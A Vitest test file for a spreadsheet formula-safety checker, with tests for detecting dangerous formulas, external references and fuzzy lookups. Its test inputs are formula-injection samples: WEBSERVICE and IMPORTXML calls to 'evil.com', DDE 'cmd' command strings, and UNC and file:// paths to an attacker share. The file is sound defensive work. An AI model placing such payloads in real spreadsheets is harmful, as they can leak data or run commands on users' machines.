import { describe, expect, it } from "vitest";
import {
  assertExactLookup,
  assertSafeFormula,
  assertSafeHyperlink,
  dangerousFormula,
  dangerousHyperlinkAddress,
  fuzzyLookupMatch
} from "./formulaSafety";

describe("formulaSafety", () => {
  it("detects network-exfiltrating functions", () => {
    expect(dangerousFormula('=WEBSERVICE("http://evil.com")')).toBe(
      "WEBSERVICE"
    );
    expect(dangerousFormula('=IF(A1,WEBSERVICE("http://evil.com"))')).toBe(
      "WEBSERVICE"
    );
    expect(dangerousFormula('=IMPORTXML("http://evil.com")')).toBe(
      "IMPORTXML"
    );
    expect(dangerousFormula('=FILTERXML(A1,"//x")')).toBe("FILTERXML");
  });

  it("detects phishing and legacy exec functions", () => {
    expect(dangerousFormula('=HYPERLINK("http://evil.com")')).toBe(
      "HYPERLINK"
    );
    expect(dangerousFormula('=EXEC("calc")')).toBe("EXEC");
    expect(dangerousFormula('=CALL("x","y","z")')).toBe("CALL");
    expect(dangerousFormula('=REGISTER("x")')).toBe("REGISTER");
  });

  it("detects DDE command injection", () => {
    expect(dangerousFormula("=cmd|'/c calc'!A0")).toBe("DDE");
    expect(dangerousFormula("= cmd'/c calc'!A0")).toBe("DDE");
  });

  it("passes safe formulas", () => {
    expect(dangerousFormula("=SUM(A1:A10)")).toBeNull();
    expect(dangerousFormula("=XLOOKUP(A1,B:B,C:C)")).toBeNull();
    expect(dangerousFormula("=SUMPRODUCT(ISNUMBER(SEARCH(A1,B2)))")).toBeNull();
    expect(dangerousFormula("")).toBeNull();
  });

  it("allowlists HYPERLINK only when enabled, without weakening others", () => {
    expect(dangerousFormula('=HYPERLINK("https://example.com")', true)).toBeNull();
    expect(
      dangerousFormula('=IF(A1,HYPERLINK("https://example.com"))', true)
    ).toBeNull();
    // 默认（配置 allowHyperlink=false）仍拦截
    expect(dangerousFormula('=HYPERLINK("https://example.com")')).toBe(
      "HYPERLINK"
    );
    // 放行 HYPERLINK 不影响其它危险函数
    expect(
      dangerousFormula('=WEBSERVICE("http://evil.com")', true)
    ).toBe("WEBSERVICE");
  });

  it("checks hyperlink addresses", () => {
    expect(dangerousHyperlinkAddress("https://example.com")).toBeNull();
    expect(dangerousHyperlinkAddress("mailto:test@example.com")).toBeNull();
    expect(dangerousHyperlinkAddress("=cmd|'/c calc'!A0")).toBe("DDE");
  });

  it("detects UNC and external workbook references in formulas", () => {
    expect(
      dangerousFormula("='\\\\evil.com\\share\\[data.xlsx]Sheet1'!A1")
    ).toBe("UNC");
    expect(
      dangerousFormula("=SUM('\\\\evil.com\\share\\[data.xlsx]Sheet1'!A1:A2)")
    ).toBe("UNC");
    expect(dangerousFormula("='[report.xlsx]Sheet1'!A1")).toBe("EXTERNAL_REF");
    // 结构化表格引用不受影响
    expect(dangerousFormula("=SUM(Table1[Score])")).toBeNull();
    expect(dangerousFormula("=SUM(A1:A10)")).toBeNull();
  });

  it("allowlists external workbook refs only for selected files", () => {
    const allowed = new Set(["B.xlsx"]);
    expect(
      dangerousFormula("='[B.xlsx]Sheet2'!A1", undefined, allowed)
    ).toBeNull();
    expect(
      dangerousFormula("=SUM('[B.xlsx]Sheet2'!$A$2:$B$7)", undefined, allowed)
    ).toBeNull();
    // 未勾选的文件仍拒绝
    expect(
      dangerousFormula("='[C.xlsx]Sheet1'!A1", undefined, allowed)
    ).toBe("EXTERNAL_REF");
    // 不传白名单时维持原行为
    expect(dangerousFormula("='[B.xlsx]Sheet2'!A1")).toBe("EXTERNAL_REF");
    // 多个引用中任一不在白名单即拒绝
    expect(
      dangerousFormula(
        "=SUM('[B.xlsx]Sheet2'!A1)+SUM('[C.xlsx]Sheet3'!A1)",
        undefined,
        allowed
      )
    ).toBe("EXTERNAL_REF");
    // UNC 不受白名单影响
    expect(
      dangerousFormula(
        "='\\\\evil.com\\share\\[data.xlsx]Sheet1'!A1",
        undefined,
        allowed
      )
    ).toBe("UNC");
  });

  it("assertSafeFormula respects the external file whitelist", () => {
    const allowed = new Set(["B.xlsx"]);
    expect(() =>
      assertSafeFormula("='[B.xlsx]Sheet2'!A1", "A1 的公式", allowed)
    ).not.toThrow();
    expect(() =>
      assertSafeFormula("='[C.xlsx]Sheet1'!A1", "A1 的公式", allowed)
    ).toThrow(/EXTERNAL_REF/);
  });

  it("detects approximate/fuzzy lookup matches", () => {
    // VLOOKUP 显式 TRUE / 1 / 省略第四参数（默认近似）都应拦截
    expect(fuzzyLookupMatch("=VLOOKUP(A2,B2:C9,2,TRUE)")).toBe("VLOOKUP");
    expect(fuzzyLookupMatch("=VLOOKUP(A2,B2:C9,2,1)")).toBe("VLOOKUP");
    expect(fuzzyLookupMatch("=VLOOKUP(A2,B2:C9,2)")).toBe("VLOOKUP");
    expect(fuzzyLookupMatch("=IF(A1=1,VLOOKUP(A2,B2:C9,2,TRUE))")).toBe(
      "VLOOKUP"
    );
    // HLOOKUP 同规则
    expect(fuzzyLookupMatch("=HLOOKUP(A1,B1:D2,2)")).toBe("HLOOKUP");
    // MATCH 省略第三参数默认 1；1 / -1 都是近似
    expect(fuzzyLookupMatch("=MATCH(A1,B:B)")).toBe("MATCH");
    expect(fuzzyLookupMatch("=MATCH(A1,B:B,1)")).toBe("MATCH");
    expect(fuzzyLookupMatch("=MATCH(A1,B:B,-1)")).toBe("MATCH");
    // LOOKUP 只有近似语义
    expect(fuzzyLookupMatch("=LOOKUP(A1,B:B,C:C)")).toBe("LOOKUP");
    // XLOOKUP match_mode 非 0
    expect(
      fuzzyLookupMatch("=XLOOKUP(A1,B:B,C:C,\"\",2)")
    ).toBe("XLOOKUP");
  });

  it("passes exact-match lookups", () => {
    expect(fuzzyLookupMatch("=VLOOKUP(A2,B2:C9,2,FALSE)")).toBeNull();
    expect(fuzzyLookupMatch("=VLOOKUP(A2,B2:C9,2,0)")).toBeNull();
    expect(fuzzyLookupMatch("=MATCH(A1,B:B,0)")).toBeNull();
    expect(fuzzyLookupMatch("=XLOOKUP(A1,B:B,C:C)")).toBeNull();
    expect(fuzzyLookupMatch("=XLOOKUP(A1,B:B,C:C,\"\",0)")).toBeNull();
    expect(fuzzyLookupMatch("=SUM(A1:A10)")).toBeNull();
    expect(fuzzyLookupMatch("")).toBeNull();
    expect(
      fuzzyLookupMatch(
        "=IF(ISNUMBER(SEARCH(\"无问题\",D2)),\"/\",\"\")"
      )
    ).toBeNull();
  });

  it("assertExactLookup throws with label context", () => {
    expect(() =>
      assertExactLookup("=VLOOKUP(A1,B:B,2)", "A1 的公式")
    ).toThrow(/模糊匹配/);
    expect(() =>
      assertExactLookup("=VLOOKUP(A1,B:B,2,FALSE)", "A1 的公式")
    ).not.toThrow();
  });

  it("detects UNC and file hyperlink addresses", () => {
    expect(dangerousHyperlinkAddress("\\\\evil.com\\share\\report.xlsx")).toBe(
      "UNC"
    );
    expect(dangerousHyperlinkAddress("//evil.com/share")).toBe("UNC");
    expect(dangerousHyperlinkAddress("file://evil.com/share")).toBe("FILE");
    expect(dangerousHyperlinkAddress("https://example.com")).toBeNull();
  });

  it("throws on unsafe formulas with label context", () => {
    expect(() => assertSafeFormula('=WEBSERVICE("x")', "A1 的公式")).toThrow(
      /A1 的公式/
    );
    expect(() => assertSafeHyperlink("=cmd|x", "A1 的超链接")).toThrow(
      /A1 的超链接/
    );
  });
});
